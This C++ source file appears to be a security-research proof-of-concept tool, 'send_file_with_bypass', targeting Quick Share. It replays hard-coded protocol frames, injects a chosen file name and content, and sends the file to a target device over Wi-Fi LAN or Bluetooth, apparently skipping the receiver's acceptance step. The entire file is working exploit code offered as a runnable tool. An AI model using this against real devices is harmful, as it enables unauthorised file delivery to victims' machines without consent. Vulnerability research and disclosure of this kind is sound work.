#include <vector>
#include <iostream>
#include <argparse/argparse.hpp>

#include "quick_share/include/quick_share_medium.hh"
#include "quick_share/proto/offline_wire_formats.pb.h"
#include "quick_share/include/quick_share_connection.hh"
#include "common/include/exceptions.hh"
#include "tools/tool_helpers/include/offline_frames_storage.hh"
#include "tools/tool_helpers/include/utils.hh"
#include "common/include/logger.hh"

using OfflineFrame = ::location::nearby::connections::OfflineFrame;

#pragma warning(push)
#pragma warning(disable : 4838)

const uint8_t BASE_FILE_OFFLINE_FRAMES_BUFFER[820] = {
    0xBA, 0x02, 0x00, 0x00, 0x08, 0x01, 0x12, 0xB5, 0x05, 0x08, 0x01, 0x12, 0xB0, 0x05, 0x0A, 0x04,
    0x41, 0x42, 0x41, 0x42, 0x12, 0x27, 0x06, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x15, 0x53, 0x61, 0x66, 0x65, 0x42, 0x72, 0x65, 0x61,
    0x63, 0x68, 0x20, 0x53, 0x69, 0x6D, 0x75, 0x6C, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0xAF, 0xBF,
    0x8C, 0xD9, 0xFB, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x28, 0x05, 0x28, 0x02, 0x28, 0x04, 0x28, 0x03,
    0x32, 0x27, 0x06, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
    0x41, 0x41, 0x41, 0x15, 0x53, 0x61, 0x66, 0x65, 0x42, 0x72, 0x65, 0x61, 0x63, 0x68, 0x20, 0x53,
    0x69, 0x6D, 0x75, 0x6C, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x3A, 0xC2, 0x04, 0x08, 0x01, 0x12, 0x11,
    0x61, 0x61, 0x3A, 0x61, 0x61, 0x3A, 0x61, 0x61, 0x3A, 0x61, 0x61, 0x3A, 0x61, 0x61, 0x3A, 0x61,
    0x61, 0x1A, 0x04, 0xC0, 0xA8, 0x01, 0x3C, 0x20, 0x01, 0x28, 0x00, 0x30, 0x99, 0x13, 0x3A, 0x4C,
    0x0A, 0x4A, 0x85, 0x2D, 0xFC, 0x2A, 0xBC, 0x28, 0x90, 0x2B, 0xF4, 0x2B, 0xCC, 0x2B, 0xF1, 0x2C,
    0x8C, 0x29, 0xE0, 0x2B, 0xC8, 0x29, 0xA0, 0x29, 0x9C, 0x2C, 0xC1, 0x2D, 0xC4, 0x2C, 0xB4, 0x29,
    0x88, 0x2C, 0xF8, 0x28, 0xA4, 0x2B, 0xB8, 0x2B, 0xB0, 0x2C, 0xD0, 0x28, 0xE4, 0x28, 0xAD, 0x2D,
    0x99, 0x2D, 0x8F, 0x13, 0x8A, 0x13, 0xEC, 0x12, 0x94, 0x13, 0x9E, 0x13, 0xA8, 0x13, 0x99, 0x13,
    0xA3, 0x13, 0xFB, 0x12, 0xF1, 0x12, 0x80, 0x13, 0x85, 0x13, 0xF6, 0x12, 0x42, 0x7C, 0x0A, 0x7A,
    0x83, 0x31, 0x93, 0x2F, 0xD3, 0x31, 0xEF, 0x30, 0xB3, 0x30, 0x97, 0x31, 0xD7, 0x2E, 0xCF, 0x2F,
    0xFF, 0x2E, 0xC3, 0x2E, 0x8B, 0x30, 0xBF, 0x31, 0x8F, 0x32, 0xA7, 0x2F, 0xAB, 0x31, 0xC7, 0x30,
    0xDB, 0x30, 0xFB, 0x31, 0xF7, 0x2F, 0xE7, 0x31, 0xEB, 0x2E, 0xE3, 0x2F, 0x9F, 0x30, 0xBB, 0x2F,
    0x88, 0x2C, 0x9C, 0x2C, 0xF8, 0x28, 0xB8, 0x2B, 0xC8, 0x29, 0xA0, 0x29, 0xA4, 0x2B, 0x85, 0x2D,
    0xCC, 0x2B, 0xC1, 0x2D, 0xB0, 0x2C, 0xD0, 0x28, 0xE4, 0x28, 0xF1, 0x2C, 0xB4, 0x29, 0xF4, 0x2B,
    0xBC, 0x28, 0x90, 0x2B, 0x99, 0x2D, 0xAD, 0x2D, 0xC4, 0x2C, 0xE0, 0x2B, 0xFC, 0x2A, 0x8C, 0x29,
    0x99, 0x13, 0x8F, 0x13, 0x80, 0x13, 0x8A, 0x13, 0x9E, 0x13, 0x94, 0x13, 0xFB, 0x12, 0xF6, 0x12,
    0xEC, 0x12, 0xA8, 0x13, 0x85, 0x13, 0xA3, 0x13, 0xF1, 0x12, 0x4A, 0x7C, 0x0A, 0x7A, 0xFF, 0x2E,
    0xBB, 0x2F, 0x97, 0x31, 0xEF, 0x30, 0x83, 0x31, 0xFB, 0x31, 0x9F, 0x30, 0xF7, 0x2F, 0xA7, 0x2F,
    0xAB, 0x31, 0xC3, 0x2E, 0xBF, 0x31, 0x93, 0x2F, 0xE7, 0x31, 0xB3, 0x30, 0xEB, 0x2E, 0xD3, 0x31,
    0xE3, 0x2F, 0xDB, 0x30, 0x8B, 0x30, 0xCF, 0x2F, 0x8F, 0x32, 0xD7, 0x2E, 0xC7, 0x30, 0x90, 0x2B,
    0x99, 0x2D, 0xF1, 0x2C, 0xCC, 0x2B, 0xB0, 0x2C, 0xBC, 0x28, 0x85, 0x2D, 0xE0, 0x2B, 0xB8, 0x2B,
    0xB4, 0x29, 0xF8, 0x28, 0x88, 0x2C, 0xD0, 0x28, 0xA4, 0x2B, 0xF4, 0x2B, 0xA0, 0x29, 0xAD, 0x2D,
    0xC4, 0x2C, 0x8C, 0x29, 0x9C, 0x2C, 0xFC, 0x2A, 0xC1, 0x2D, 0xC8, 0x29, 0xE4, 0x28, 0x8A, 0x13,
    0xEC, 0x12, 0x85, 0x13, 0x99, 0x13, 0xF1, 0x12, 0x9E, 0x13, 0x80, 0x13, 0xA8, 0x13, 0xFB, 0x12,
    0xA3, 0x13, 0x8F, 0x13, 0x94, 0x13, 0xF6, 0x12, 0x52, 0x56, 0x0A, 0x54, 0xD7, 0x2E, 0xBF, 0x31,
    0xFB, 0x31, 0x8B, 0x30, 0xDB, 0x30, 0x93, 0x2F, 0xEF, 0x30, 0xC7, 0x30, 0x8F, 0x32, 0xA7, 0x2F,
    0xBB, 0x2F, 0xE3, 0x2F, 0xE7, 0x31, 0xC3, 0x2E, 0xAB, 0x31, 0x97, 0x31, 0x83, 0x31, 0xB3, 0x30,
    0x9F, 0x30, 0xF7, 0x2F, 0xEB, 0x2E, 0xD3, 0x31, 0xFF, 0x2E, 0xCF, 0x2F, 0x85, 0x2D, 0xF1, 0x2C,
    0xC1, 0x2D, 0x99, 0x2D, 0xAD, 0x2D, 0x8F, 0x13, 0xF6, 0x12, 0x8A, 0x13, 0xEC, 0x12, 0xA3, 0x13,
    0x85, 0x13, 0xFB, 0x12, 0xF1, 0x12, 0x80, 0x13, 0xA8, 0x13, 0x94, 0x13, 0x99, 0x13, 0x9E, 0x13,
    0x5A, 0x7C, 0x0A, 0x7A, 0x8F, 0x32, 0xEB, 0x2E, 0xAB, 0x31, 0xC3, 0x2E, 0xDB, 0x30, 0xFF, 0x2E,
    0xD7, 0x2E, 0xC7, 0x30, 0xCF, 0x2F, 0xE3, 0x2F, 0xD3, 0x31, 0xFB, 0x31, 0x83, 0x31, 0x9F, 0x30,
    0xEF, 0x30, 0xA7, 0x2F, 0xBF, 0x31, 0xE7, 0x31, 0xB3, 0x30, 0x97, 0x31, 0xF7, 0x2F, 0x8B, 0x30,
    0x93, 0x2F, 0xBB, 0x2F, 0xD0, 0x28, 0xC4, 0x2C, 0xE0, 0x2B, 0xB0, 0x2C, 0x99, 0x2D, 0xC1, 0x2D,
    0xCC, 0x2B, 0x85, 0x2D, 0x88, 0x2C, 0x8C, 0x29, 0x90, 0x2B, 0xAD, 0x2D, 0xFC, 0x2A, 0x9C, 0x2C,
    0xA0, 0x29, 0xA4, 0x2B, 0xC8, 0x29, 0xF4, 0x2B, 0xF1, 0x2C, 0xB8, 0x2B, 0xB4, 0x29, 0xE4, 0x28,
    0xBC, 0x28, 0xF8, 0x28, 0x80, 0x13, 0x8A, 0x13, 0xA8, 0x13, 0xFB, 0x12, 0x94, 0x13, 0x9E, 0x13,
    0x99, 0x13, 0xA3, 0x13, 0xEC, 0x12, 0xF6, 0x12, 0x85, 0x13, 0x8F, 0x13, 0xF1, 0x12, 0x14, 0x00,
    0x00, 0x00, 0x08, 0x01, 0x12, 0x10, 0x08, 0x02, 0x1A, 0x0C, 0x08, 0x00, 0x18, 0x01, 0x22, 0x02,
    0x08, 0x01, 0x28, 0x00, 0x38, 0x04, 0x3A, 0x00, 0x00, 0x00, 0x08, 0x01, 0x12, 0x36, 0x08, 0x03,
    0x22, 0x32, 0x08, 0x01, 0x12, 0x1E, 0x08, 0xF6, 0xFD, 0x9E, 0xDB, 0xD7, 0xC9, 0xAA, 0xD8, 0xB8,
    0x01, 0x10, 0x02, 0x18, 0x06, 0x20, 0x00, 0x2A, 0x0B, 0x00, 0x62, 0x6C, 0x61, 0x62, 0x6C, 0x61,
    0x2E, 0x74, 0x78, 0x74, 0x1A, 0x0E, 0x08, 0x00, 0x10, 0x00, 0x1A, 0x06, 0x62, 0x6C, 0x61, 0x62,
    0x6C, 0x61, 0x20, 0x00, 0x1C, 0x00, 0x00, 0x00, 0x08, 0x01, 0x12, 0x18, 0x08, 0x03, 0x22, 0x14,
    0x08, 0x01, 0x12, 0x08, 0x08, 0x00, 0x10, 0x02, 0x18, 0x06, 0x20, 0x00, 0x1A, 0x06, 0x08, 0x01,
    0x10, 0x06, 0x20, 0x01};

#pragma warning(pop)

static const GUID QUICK_SHARE_BT_GUID = {0xA82EFA21, 0xAE5C, 0x3DDE, {0x9B, 0xBC, 0xF1, 0x6D, 0xA7, 0xB1, 0x6C, 0x5A}};
static const unsigned int PRE_DISCONNECTION_DELAY = 500; // millis

void send_file_with_bypass(IMedium * medium, const char * file_path, std::vector<uint8_t> file_name) {
    unsigned int current_offline_frame_index = 0;
    size_t file_size = get_file_size(file_path);

    std::vector<std::unique_ptr<OfflineFrame>> offline_frames = parse_offline_frames_buffer(BASE_FILE_OFFLINE_FRAMES_BUFFER, sizeof(BASE_FILE_OFFLINE_FRAMES_BUFFER));
    std::unique_ptr<OfflineFrame> &file_offline_frame = offline_frames[2];
    std::unique_ptr<OfflineFrame> &file_done_offline_frame = offline_frames[3];

    logger_log(LoggerLogLevel::LEVEL_INFO, "Setting the name and the content for the file to send");
    file_offline_frame->mutable_v1()->mutable_payload_transfer()->mutable_payload_header()->set_file_name(file_name.data(), file_name.size());
    file_offline_frame->mutable_v1()->mutable_payload_transfer()->mutable_payload_header()->set_total_size(file_size);
    file_offline_frame->mutable_v1()->mutable_payload_transfer()->mutable_payload_chunk()->set_body(read_file_content(file_path)->data(), file_size);

    file_done_offline_frame->mutable_v1()->mutable_payload_transfer()->mutable_payload_header()->set_total_size(file_size);

    QuickShareConnection quick_share_connection(medium);
    logger_log(LoggerLogLevel::LEVEL_INFO, "Connecting to the target");
    quick_share_connection.connect();

    logger_log(LoggerLogLevel::LEVEL_INFO, "Sending Connection Request");
    quick_share_connection.send_offline_frame(*(offline_frames[current_offline_frame_index++]));

    quick_share_connection.do_handshake();

    logger_log(LoggerLogLevel::LEVEL_INFO, "Receiving Connection Response");
    quick_share_connection.recv_offline_frame();

    logger_log(LoggerLogLevel::LEVEL_INFO, "Sending Connection Response");
    quick_share_connection.send_offline_frame(*(offline_frames[current_offline_frame_index++]));

    logger_log(LoggerLogLevel::LEVEL_INFO, "Sending File Payload Transfer");
    quick_share_connection.send_offline_frame(*(offline_frames[current_offline_frame_index++]), true);

    logger_log(LoggerLogLevel::LEVEL_INFO, "Sending File Payload Transfer Done");
    quick_share_connection.send_offline_frame(*(offline_frames[current_offline_frame_index++]), true);

    logger_log(LoggerLogLevel::LEVEL_INFO, "Sleeping 500 millis before disconnecting, allowing the target to read our last packet");
    Sleep(PRE_DISCONNECTION_DELAY);

    logger_log(LoggerLogLevel::LEVEL_INFO, "Disconnecting");
    quick_share_connection.disconnect();
}


int main(int argc, char **argv)
{
    int main_ret_val = 0;
    BluetoothMedium bt_medium;
    WifiLanMedium wifi_medium;
    std::string file_path;
    std::string base64_file_name;
    IMedium *medium = nullptr;
    std::vector<uint8_t> file_name;

    argparse::ArgumentParser * chosen_parser = nullptr;

    argparse::ArgumentParser wifi_lan_parser("wifi_lan");
    wifi_lan_parser.add_description("Send the file over the WIFI_LAN medium");
    wifi_lan_parser.add_argument("ip").help("The ip address where the target Quick Share device is listening");
    wifi_lan_parser.add_argument("port").help("The port where the target Quick Share device is listening").scan<'u', unsigned int>();
    wifi_lan_parser.add_argument("file_path").help("Path to the file with the content to send");
    wifi_lan_parser.add_argument("base64_file_name").help("The name to set for the sent file, in base64");

    argparse::ArgumentParser bt_parser("bt");
    bt_parser.add_description("Send the file over the BLUETOOTH medium");
    bt_parser.add_argument("mac_addr").help("The bluetooth MAC address of the target Quick Share device");
    bt_parser.add_argument("file_path").help("Path to the file with the content to send");
    bt_parser.add_argument("base64_file_name").help("The name to set for the sent file, in base64");

    argparse::ArgumentParser parser("send_file_with_bypass.exe");
    parser.add_subparser(wifi_lan_parser);
    parser.add_subparser(bt_parser);


    // Don't trust third party argparse library to not throw exceptions
    try
    {
        parser.parse_args(argc, argv);
        if (parser.is_subcommand_used("wifi_lan"))
        {
            std::string ip = wifi_lan_parser.get("ip");
            unsigned int port = wifi_lan_parser.get<unsigned int>("port");
            wifi_medium.set_target(ip.c_str(), port);
            medium = &wifi_medium;
            chosen_parser = &wifi_lan_parser;
        } else if (parser.is_subcommand_used("bt")) {
            std::string bt_mac = bt_parser.get("mac_addr");
            bt_medium.set_target(bt_mac.c_str(), QUICK_SHARE_BT_GUID);
            medium = &bt_medium;
            chosen_parser = &bt_parser;
        } else {
            std::cout << "You must choose a medium type (wifi_lan / bt)" << std::endl;
            return 1;
        }

        file_path = chosen_parser->get("file_path");
        base64_file_name = chosen_parser->get("base64_file_name");
    }
    catch (const std::exception &err)
    {
        std::cerr << err.what() << std::endl;
        std::cerr << parser;
        return 1;
    }

    file_name = base64_decode(base64_file_name.c_str());
    
    try {
        initialize_wsa(); // Must be called once in a program in order to use Windows sockets
        send_file_with_bypass(medium, file_path.c_str(), file_name);
    } catch (BaseException e) {
        logger_log(LoggerLogLevel::LEVEL_ERROR, "Got an exception:\n%s", e.what());
        main_ret_val = 1;
    }

    WSACleanup(); // Must be called before program exit if WSA was initialized
    return main_ret_val;
}